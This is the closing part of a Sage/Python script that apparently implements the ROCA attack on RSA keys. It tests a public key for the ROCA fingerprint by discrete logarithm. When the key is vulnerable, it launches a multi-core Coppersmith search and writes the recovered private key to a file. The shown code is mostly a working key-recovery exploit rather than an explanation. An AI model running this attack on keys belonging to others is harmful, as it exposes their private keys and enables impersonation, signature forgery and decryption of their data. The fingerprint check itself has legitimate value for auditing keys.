            runde += _sage_const_1 
            print('\n')

    return M_old, ord_new


# return the function parameters until each core is cracking
def parm(n, M_strich, m, t, c, ord_new, privkey, event):
    rest = multiprocessing.cpu_count()

    while rest > _sage_const_0 :
        yield {'cpu': rest, 'n': n, 'M_strich': M_strich, 'm': m, 't': t, 'c': c, 'ord_new': ord_new,
               'privkey': privkey, 'event': event, }
        rest -= _sage_const_1 


def fingerprint(M, n):
    # if a discrete logarithm is available, the key is vulerable to ROCA
    try:
        b = Mod(_sage_const_65537 , M)
        c = discrete_log(n, b)
        print("The Key is vulnerable to ROCA!\nStart Cracking...")
        return _sage_const_1 
    except ValueError:
        print("The Key is resistant to ROCA!")
        return _sage_const_0 


if __name__ == "__main__":
    if TEST:
        unittest.main()

    parser = argparse.ArgumentParser()
    parser.add_argument('pubkey', help='File containing the public key')
    parser.add_argument('privkey', help='File to write the private key')

    args = parser.parse_args()

    with open(args.pubkey, 'r') as f:
        pub_key = RSA.importKey(f.read())

        print "\nPublic Key with %d bits found" % pub_key.size()

        # Get Coppersmith parameter for key size
        param = get_param(pub_key.size())
        # get first <anz> primes
        n = get_primes(param['anz'])

        # multiply all <anz> primes
        M = calcM(n)
        # Checks if PubKey is Vulnerable to ROCA
        if fingerprint(M, pub_key.n) == _sage_const_1 :
            # calculate limes for exit condition in greedy heruistic
            limes = math.log(pub_key.n, _sage_const_2 ) / _sage_const_4 

            # limes from paper does not work - correct it
            #limes = limes * 1.11
            # print "limes: %d" % (limes)
            limes = limes*_sage_const_1p5 
            # get reduced M -> M_strich with its order
            M_strich, ord_new = greedy_heuristic(n, M, limes)
            if DEBUG:
                print("Bitlength of M %d" % int(M).bit_length())
                print("Bitlength of M_strich %d" % int(M_strich).bit_length())
                print("Neue Ordnung M_strich: %d" % ord_new)
                print("Ordnung von M: %d" % order(n))

            # calculate c - its needed to define the search space
            c = log(Mod(pub_key.n, M_strich), _sage_const_65537 )
            # print("c: %d" % c)

            # Start Cracking on all available Cores
            p = multiprocessing.Pool()
            manager = multiprocessing.Manager()
            event = manager.Event()
            p.map(worker, parm(pub_key.n, M_strich, param['m'], param['t'], c, ord_new, args.privkey, event))
            event.wait()
            p.terminate()
        else:
            print("Resistant Key: Terminating execution!")

